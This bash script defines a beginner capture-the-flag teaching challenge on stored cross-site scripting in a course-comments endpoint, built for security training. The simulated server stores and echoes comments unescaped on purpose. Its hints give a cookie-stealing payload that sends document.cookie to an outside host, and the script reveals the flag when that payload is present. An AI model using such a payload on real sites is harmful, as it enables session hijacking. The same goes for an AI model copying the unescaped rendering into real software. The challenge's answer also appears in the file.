#!/usr/bin/env bash
# =============================================================================
#  Easy — Stored XSS: Course Comments
#  Teaching room (classic stored-XSS). A moderator "bot" renders comments in a
#  real browser; its session cookie IS the flag. Inject script that exfiltrates
#  document.cookie and read it back from the moderation view.
# =============================================================================

xss_provision() {
  local id="$1" d; d="$(pv_target_dir "$id")"; mkdir -p "$d"
  : > "$d/comments.txt"          # empty comment store
}

# POST /api/courses/42/comments (store, rendered raw), GET .../comments,
# GET /admin/moderate (moderator bot renders — cookie = flag).
xss_handle() {
  local store; store="$(pv_target_dir easy-xss)/comments.txt"
  case "$REQ_METHOD $REQ_PATH" in
    "POST /api/courses/42/comments")
      local body; body="$(mw_field body)"; [[ -z "$body" ]] && body="$REQ_BODY"
      printf '%s\n' "$body" >> "$store"
      # Server reflects the comment back UN-escaped (the bug).
      mw_resp "201 Created" "{\"stored\":true,\"rendered\":\"$body\"}" ;;
    "GET /api/courses/42/comments")
      mw_resp "200 OK" "$(sed 's/^/- /' "$store" 2>/dev/null || true)" ;;
    "GET /admin/moderate")
      if grep -qi '<script' "$store" 2>/dev/null && grep -qi 'cookie' "$store" 2>/dev/null; then
        mw_resp "200 OK" "moderator's browser executed an injected comment and leaked its cookie:
session=$(flags_plaintext easy-xss)"
      else
        mw_resp "200 OK" "moderator reviewed comments — nothing executed." ;
      fi ;;
    *) mw_resp "404 Not Found" '{"error":"unknown route"}' ;;
  esac
}

register_challenge \
  id="easy-xss" \
  title="Stored XSS: Course Comments - Easy" \
  diff="Easy" points="100" penalty="15" \
  owasp="A03:2021 Injection (Stored XSS)" \
  cvss="6.1 (AV:N/UI:R)" \
  slug="stored_xss_course_comments" \
  finding="Teaching room — mirrors an XSS sink hardened in the real engagement" \
  endpoint="POST /api/courses/42/comments  →  GET /admin/moderate" \
  tools="curl,httpie" \
  scenario="Course comments are stored and later rendered to staff without output encoding. A moderator bot reviews new comments in a real browser session — and that session cookie is what you're after." \
  objective="Store a comment that steals the moderator's cookie when rendered, then read the moderation view to capture the leaked session flag." \
  remediation="Contextually output-encode/escape user content; set HttpOnly cookies; add a strict CSP." \
  hints="First store a comment: colab-http POST /api/courses/42/comments -d 'body=hello'. Notice it is echoed back raw.
The moderator view is GET /admin/moderate. It only 'fires' if a stored comment contains a script that touches document.cookie.
Store: body=<script>fetch('http://me/'+document.cookie)</script>  then GET /admin/moderate." \
  provision="xss_provision" handler="xss_handle"
